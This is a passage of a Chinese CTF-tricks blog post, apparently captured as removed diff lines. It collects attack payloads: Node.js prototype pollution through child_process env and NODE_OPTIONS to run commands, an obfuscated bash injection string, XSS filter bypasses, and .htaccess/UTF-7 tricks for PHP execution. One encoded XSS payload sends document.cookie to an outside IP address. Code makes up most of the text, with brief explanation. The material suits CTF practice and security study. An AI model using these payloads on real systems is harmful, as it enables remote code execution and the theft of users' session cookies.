-<p>Nodejs在使用child_process建立子进程时，会将options对象的env属性作为环境变量加载到<code>/proc/self/environ</code>中，但是options对象默认为空，这就导致了只要污染Object.env，就能控制<code>/proc/self/environ</code>的值。</p>
-<p>当node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include，而NODE_OPTIONS是作为环境变量加载的，所以我们可以通过污染NODE_OPTIONS的值，来加载/proc/self/environ，执行我们之前污染的options.env的值。</p>
-<p>文章中的payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// test.js</span><br><span class="line">proc = require(&apos;child_process&apos;);</span><br><span class="line">var aa = &#123;&#125;</span><br><span class="line">aa.__proto__.env = &#123;&apos;AAAA&apos;:&apos;console.log(process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /flag&apos;).toString())//&apos;,&apos;NODE_OPTIONS&apos;:&apos;--require /proc/self/environ&apos;&#125;  --require -r</span><br><span class="line">proc.fork(&apos;./function.js&apos;);</span><br><span class="line"></span><br><span class="line">//function.js</span><br><span class="line">console.log(&apos;this is func&apos;)</span><br></pre></td></tr></table></figure>
-
-<p>利用条件：node&gt;v8.0，js使用child_process创建子进程。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;0&#125;&lt;&lt;&lt;\$\&apos;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$&#123;##&#125;$&#123;##&#125;$(())))\&apos;&lt;&lt;&lt;\$\&apos;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$(())$(())$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$&#123;##&#125;$&#123;##&#125;$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$&#123;##&#125;$(())$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$(())$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$&#123;##&#125;$(())$&#123;##&#125;$(())))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$(())))\&apos;</span><br></pre></td></tr></table></figure>
-
-<h3 id="XSS绕过姿势"><a href="#XSS绕过姿势" class="headerlink" title="XSS绕过姿势"></a>XSS绕过姿势</h3><p>小括号过滤了可以用反引号代替</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;setTimeout`alert\u0028document.cookie\u0029`;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;eval(&quot;window.location.href=&apos;http://8.129.69.85:2333&apos;&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;eval&amp;#40;&amp;#34;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#56;&amp;#46;&amp;#49;&amp;#50;&amp;#57;&amp;#46;&amp;#54;&amp;#57;&amp;#46;&amp;#56;&amp;#53;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#63;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#61;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#34;&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><a href="http://web.node3.buuoj.cn/post/35f5dcee21e6bcc461f6021ba07f8bba.html" target="_blank" rel="noopener">http://web.node3.buuoj.cn/post/35f5dcee21e6bcc461f6021ba07f8bba.html</a></p>
-<p><a href="http://web.node3.buuoj.cn/post/97b32351779495478f94dc5ff9537353.html" target="_blank" rel="noopener">http://web.node3.buuoj.cn/post/97b32351779495478f94dc5ff9537353.html</a></p>
-<h2 id="htaccess绕过姿势"><a href="#htaccess绕过姿势" class="headerlink" title="htaccess绕过姿势"></a>htaccess绕过姿势</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-ph\</span><br><span class="line">p .a</span><br><span class="line"></span><br><span class="line">php_value auto_append_file .htaccess    append or prepend</span><br><span class="line">#&lt;?php phpinfo();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># .htaccess</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"> </span><br><span class="line"># index.php</span><br><span class="line">+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs</span><br><span class="line"></span><br><span class="line">可以转义换行符，从而达到多行注释</span><br><span class="line">#\</span><br></pre></td></tr></table></figure>
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/trick//" class="article-tag-list-link color1">trick</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/ctf总结/">展开全文 >></a>
         </p>
       
 
